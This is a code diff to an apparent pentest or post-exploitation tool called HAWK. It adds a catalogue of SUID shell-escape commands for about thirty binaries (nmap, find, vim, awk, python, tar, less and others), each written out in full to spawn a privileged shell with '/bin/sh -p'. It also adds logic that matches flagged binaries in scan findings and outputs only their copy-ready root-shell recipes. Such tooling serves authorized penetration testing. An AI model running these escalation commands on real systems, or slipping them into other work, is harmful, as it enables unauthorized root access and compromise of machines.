@@ -851,6 +851,95 @@ def _matcher_hits(m: dict, findings: list[dict],
     return False, ""
 
 
+# ── SUID / GTFOBins: per-binary shell escapes ─────────────────────────────────
+# The suid_gtfobins path used to dump EVERY recipe as one wall of commands; the
+# operator then had to find the one line for the binary HAWK actually flagged —
+# and pasting the whole block into an interactive tool (nmap!) fed stray lines
+# into its prompt.  match() now keys on the flagged binaries and emits ONLY
+# their escape(s), so COPY EXPLOIT yields the exact recipe for THIS box.
+# Interactive escapes (nmap / pagers / ed) keep the "then type X" step as a
+# COMMENT so pasting the block never mis-drives the interactive prompt.
+# Binaries without a curated recipe get a targeted gtfobins pointer, not a wall.
+_GTFO_SUID_RECIPES = {
+    "nmap": [
+        "nmap --interactive",
+        "#   then, at the  nmap>  prompt, type:  !sh   (-> root shell; check: id)",
+    ],
+    "find":    ["find . -exec /bin/sh -p \\; -quit"],
+    "vim":     ["vim -c ':!/bin/sh -p' -E"],
+    "vi":      ["vi -c ':!/bin/sh -p' -E"],
+    "view":    ["view -c ':!/bin/sh -p' -E"],
+    "rvim":    ["rvim -c ':!/bin/sh -p' -E"],
+    "awk":     ["awk 'BEGIN {system(\"/bin/sh -p\")}'"],
+    "gawk":    ["gawk 'BEGIN {system(\"/bin/sh -p\")}'"],
+    "mawk":    ["mawk 'BEGIN {system(\"/bin/sh -p\")}'"],
+    "perl":    ["perl -e 'exec \"/bin/sh -p\";'"],
+    "python":  ["python -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'"],
+    "python2": ["python2 -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'"],
+    "python3": ["python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'"],
+    "ruby":    ["ruby -e 'exec \"/bin/sh -p\"'"],
+    "lua":     ["lua -e 'os.execute(\"/bin/sh -p\")'"],
+    "tar":     ["tar -cf /dev/null /dev/null --checkpoint=1 "
+                "--checkpoint-action=exec=/bin/sh"],
+    "env":     ["env /bin/sh -p"],
+    "less":    ["less /etc/profile", "#   then at the pager, type:  !/bin/sh -p"],
+    "more":    ["more /etc/profile", "#   then at the pager, type:  !/bin/sh -p"],
+    "man":     ["man man", "#   then at the pager, type:  !/bin/sh -p"],
+    "ed":      ["ed", "#   then type:  !/bin/sh -p"],
+    "bash":    ["bash -p"],
+    "sh":      ["sh -p"],
+    "dash":    ["dash -p"],
+    "ksh":     ["ksh -p"],
+    "busybox": ["busybox sh -p"],
+    "make":    ["make -s --eval=$'x:\\n\\t-'\"/bin/sh -p\""],
+    "expect":  ["expect -c 'spawn /bin/sh -p; interact'"],
+    "nice":    ["nice /bin/sh -p"],
+    "ionice":  ["ionice /bin/sh -p"],
+    "taskset": ["taskset 1 /bin/sh -p"],
+    "stdbuf":  ["stdbuf -i0 /bin/sh -p"],
+    "setarch": ["setarch $(uname -m) /bin/sh -p"],
+    "flock":   ["flock -u / /bin/sh -p"],
+    "xargs":   ["echo | xargs -a /dev/null sh -p"],
+}
+
+
+# Bullet lines in the finding description look like "  • /usr/bin/nmap".
+_SUID_BULLET_RE = re.compile(r"^\s*[\u2022\-\*]\s*(/\S+)")
+
+
+def _suid_binaries_from_findings(findings: list[dict]) -> list[str]:
+    """Basenames of the SUID binaries an 'Exploitable SUID binaries' finding
+    lists in its description.  Order preserved, de-duplicated."""
+    seen: list[str] = []
+    for f in findings:
+        if "exploitable suid binaries" not in (f.get("title") or "").lower():
+            continue
+        for ln in (f.get("description") or "").splitlines():
+            m = _SUID_BULLET_RE.match(ln)
+            if m:
+                base = m.group(1).rsplit("/", 1)[-1]
+                if base and base not in seen:
+                    seen.append(base)
+    return seen
+
+
+def _gtfo_suid_exploit(binaries: list[str]) -> list[str]:
+    """Exploit block for suid_gtfobins built from the flagged binaries ONLY —
+    the exact recipe(s) for this box, not the whole gtfobins catalogue."""
+    lines: list[str] = []
+    for b in binaries:
+        lines.append(f"# {b}  (SUID-root -> shell):")
+        recipe = _GTFO_SUID_RECIPES.get(b)
+        if recipe:
+            lines.extend(recipe)
+        else:
+            lines.append(f"#   see gtfobins.github.io/gtfobins/{b}/#suid")
+        lines.append("")
+    lines.append("# NOTE: -p keeps the elevated EUID; without it bash/sh drop")
+    lines.append("# privileges when EUID != UID and the SUID shell de-elevates.")
+    return lines
+
+
 def match(findings: list[dict], *,
           kernel: str = "", user: str = "", host: str = "",
           target_ip: str = "",
@@ -885,6 +974,21 @@ def match(findings: list[dict], *,
                 entry["_target_ip"] = target_ip
                 entry["_docker_images"] = docker_images or []
                 entry["_internet"] = internet
+                # suid_gtfobins: replace the whole-catalogue exploit block
+                # with ONLY the recipe(s) for the binaries HAWK actually
+                # flagged, so COPY EXPLOIT / the rendered block give the exact
+                # escape for this box instead of a wall of unrelated commands.
+                if pat.get("id") == "suid_gtfobins":
+                    _bins = _suid_binaries_from_findings(findings)
+                    if _bins:
+                        entry["exploit"] = _gtfo_suid_exploit(_bins)
+                        entry["_suid_binaries"] = _bins
+                        entry["summary"] = (
+                            "HAWK flagged SUID-root binaries that are gtfobins "
+                            "shell-escapes: " + ", ".join(_bins) + ".  Each turns "
+                            "into a root shell with its own recipe below — run it "
+                            "in your target shell (verify with: id).  The lines "
+                            "are selectable; copy just the one you need.")
                 out.append(entry)
                 break  # don't double-count a pattern even if 2 matchers hit
 
